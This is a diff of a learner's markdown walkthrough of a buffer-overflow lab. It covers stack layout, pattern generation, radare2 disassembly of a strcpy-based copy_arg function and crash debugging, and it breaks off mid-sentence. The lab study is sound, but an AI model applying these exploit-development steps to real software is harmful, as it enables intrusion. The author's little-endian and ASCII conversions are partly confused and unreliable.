@@ -1083,8 +1083,7 @@ void copy_arg(char *string)
     strcpy(buffer, string);                                     
     printf("%s\n", buffer);                                     
     return 0;                                                   
-}                                                               
-                                                                
+}                                                                         
 int main(int argc, char **argv)                                 
 {                                                               
     printf("Here's a program that echo's out your input\n");    
@@ -1097,8 +1096,7 @@ int main(int argc, char **argv)
 
 - The buffer is 140 bytes
 - The 64-bit architecture uses an 8-byte base pointer (rbp)
-- The minimum overflow length is 149 bytes to overflow into the return address
-- The given shellcode is 30 bytes, dropping the number of required NOPS to 118 (again, minimum), so the shellcode begins at 149.
+- The minimum overflow length is 148 bytes to reach the return address and 149 bytes to begin overwriting the return address
 
 #### Find the Segmentation Error
 
@@ -1127,43 +1125,108 @@ $ ./program ARGUMENT_HERE
 //         This becomes argv[1]
 ```
 
-`:> /buffer-overflow $(python -c "print('\x41'*144)")` causes the segementation error
+`:> /buffer-overflow $(python -c "print('\x41'*144)")` causes the segementation error. However, this seems like it's too soon, based on the previously identified known information. We shouldn't see the segmentation error prior to `149`.
+
+The previously stated known information assumes the stack looks like:  
+
+```md
+[140-byte buffer][8-byte rbp][return address]
+```
+
+The early fault indicates there is a different memory layout. It's possible the compiler allocated less space than expected at some point. 
+
+It's possible, also, there is some alignment padding added by the compiler, making the stack look:
+
+```md
+[140-byte buffer][alignment padding (4 bytes?)][8-byte rbp][return address]
+```
 
 #### Generate A Test Pattern
 
 Continuing to use `\x41` will eventually fail because it will not demonstrate WHERE the program crash is actually caused, only that a crash is caused.  
 
-We can be reasonably certain we will not need more than two-hundred bytes. So generate a 200-by pattern pattern with python.  
+We can use a pattern of 200 bytes to make sure we get something we can trace.  
 
 `:> python -c "print(''.join([chr(65 + (i % 26)) + str(i % 10) for i in range(100)]))" > pattern.txt`
 
 ![Pattern Geenration](assets/buffer-overflow-16-task8-5.png)  
 
+Since we are already using radare2, we can use the simpler regg2: `:> regg2 -P 200 -r -o pattern.txt`
+
+![Different Pattern Geenration](assets/buffer-overflow-17-task8-6.png)  
+
+This gives us a string of four-byte characters that are still random within the overall string. This will allow us to trace the offset where the overflow happens. 
+
+#### Examine the flow
+
+Since we started in debug mode, radare starts at the entry point instead of main().
+
+Use `:> s main` to find main(), then `pdf` to 'print disassembly of function' main()
+
+![pdf main](assets/buffer-overflow-17a-task8-6a.png)
+
+```asm
+[0x7ffff7dd9ef0]> s main
+[0x00400564]> pdf
+ 51: int main (int argc, char **argv, char **envp);
+           ; var int64_t var_10h @ rbp-0x10
+           ; var int64_t var_4h @ rbp-0x4
+           ; arg int argc @ rdi
+           ; arg char **argv @ rsi
+           ; DATA XREF from entry0 @ 0x40046d
+           0x00400564      55             push rbp
+           0x00400565      4889e5         mov rbp, rsp
+           0x00400568      4883ec10       sub rsp, 0x10
+           0x0040056c      897dfc         mov dword [var_4h], edi     ; argc <- count of command line arguments; value is moved from edit to var_4h
+           0x0040056f      488975f0       mov qword [var_10h], rsi    ; argv <- moves the memory address of argv array from rsi to var_10h
+           0x00400573      bf30064000     mov edi, str.Here_s_a_program_that_echo_s_out_your_input ; 0x400630 ; "Here's a program that echo's out your input"
+           0x00400578      e8c3feffff     call sym.imp.puts           ; int puts(const char *s) <- puts prints the string to stdout
+           0x0040057d      488b45f0       mov rax, qword [var_10h] <- go to memory location rbp-0x10, get the value stored there and place that value into rax. The value at this location is the memory address of argv>
+           0x00400581      4883c008       add rax, 8 <- add 8 to value (memory address) at rax, effectivly now pointing to argv[1]. In this program, the user's input>
+           0x00400585      488b00         mov rax, qword [rax] <- no longer holding a pointer to the memory storing argv[1]. Now holding the memory address of argv[1]>
+           0x00400588      4889c7         mov rdi, rax <- moves the memory address of argv[1] to rdi. RDI is the 64-bit register that holds the first argument to a function. The next step is the call to a function that will expect a value in RDI. >
+           0x0040058b      e897ffffff     call sym.copy_arg <- calle the vulnerable function>
+           0x00400590      b800000000     mov eax, 0
+           0x00400595      c9             leave
+           0x00400596      c3             ret
+[0x00400564]> 
+
+```
+
+#### Call the Vulnerable Function  
+
+```asm
+[0x00400564]> s sym.copy_arg
+[0x00400527]> pdf
+ 61: sym.copy_arg (int64_t arg1);
+           ; var int64_t var_98h @ rbp-0x98 < >
+           ; var int64_t var_90h @ rbp-0x90
+           ; arg int64_t arg1 @ rdi
+           ; CALL XREF from main @ 0x40058b
+           0x00400527      55             push rbp
+           0x00400528      4889e5         mov rbp, rsp
+           0x0040052b      4881eca00000.  sub rsp, 0xa0
+           0x00400532      4889bd68ffff.  mov qword [var_98h], rdi    ; arg1
+           0x00400539      488b9568ffff.  mov rdx, qword [var_98h]
+           0x00400540      488d8570ffff.  lea rax, [var_90h]
+           0x00400547      4889d6         mov rsi, rdx
+           0x0040054a      4889c7         mov rdi, rax
+           0x0040054d      e8defeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
+           0x00400552      488d8570ffff.  lea rax, [var_90h]
+           0x00400559      4889c7         mov rdi, rax
+           0x0040055c      e8dffeffff     call sym.imp.puts           ; int puts(const char *s)
+           0x00400561      90             nop
+           0x00400562      c9             leave
+           0x00400563      c3             ret
+
+```
+
+
 #### Crash and Debug  
 
-First set up the analysis with `aaaa`. This results in some odd output and not really sureif it will cause issues:  
+`:> r2 -d ./buffer-overflow`
 
-![Odd Output](assets/buffer-overflow-18-task8-7a.png)  
-
-After some looking around ( and by "looking around" I mean asking Claude 4 Sonnet)... here is what I found:  
-
-```md
-Process with PID 12870 started...     # ✅ Debug process started successfully
-= attach 12870 12870                   # ✅ Attached to the process
-bin.baddr 0x00400000                   # ✅ Binary base address identified
-[0x7ffff7dd9ef0]>                      # ✅ You're now in radare2 debug mode
-
-The warnings you see are normal in debug mode and can be safely ignored for buffer overflow analysis:
-[Cannot analyze at 0x00600ff0g with sym. and entry0 (aa)
-Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
-[TOFIX: aaft can't run in debugger mode.
-
-These happen because:
-
-- Some analysis features work better on static files than live processes
-- radare2 is trying to analyze memory ranges that aren't accessible yet
-- Some advanced analysis doesn't work in debug mode
-```
+First set up the analysis with `aaaa`.
 
 Since we know the weakness is in the copy_arg function we will use `pdf @sym.copy_arg` to print the function:  
 Set the breakpoint at the return address: `db 0x00400563`
@@ -1171,11 +1234,21 @@ Set the breakpoint at the return address: `db 0x00400563`
 ![Set Breakpoint](assets/buffer-overflow-19-task8-8b.png)
 
 
-**Run The Pattern** 
 
-`:> dc $(cat pattern.txt)` to cause the crash
+**Run The Pattern:** `:> dc $(cat pattern.txt)` to cause the crash
 
 ![Execute the Pattern](assets/buffer-overflow-20-task8-9.png) 
 
+**Inspect RSP:** `:> dr rsp`
 
-**Inspect RSP**
+```md
+[0x7ffff7b66a66]> dr rsp
+0x7fffffffe2d8
+[0x7ffff7b66a66]> px 8 @ rsp
+- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0x7fffffffe2d8  5205 4000 0000 0000                      R.@.....
+```
+
+At `rsp`, the offset is `0x7fffffffe2d8`. The value is `520540`. Since 64-bit architecture works in little-endian, we need to convert this back to big-endian: `400552` which, when converted to ASCII is `R.@.....`. Unfortunately, this  is not in the pattern.
+
+The crash happened before the breakpoing set at `ret` and 
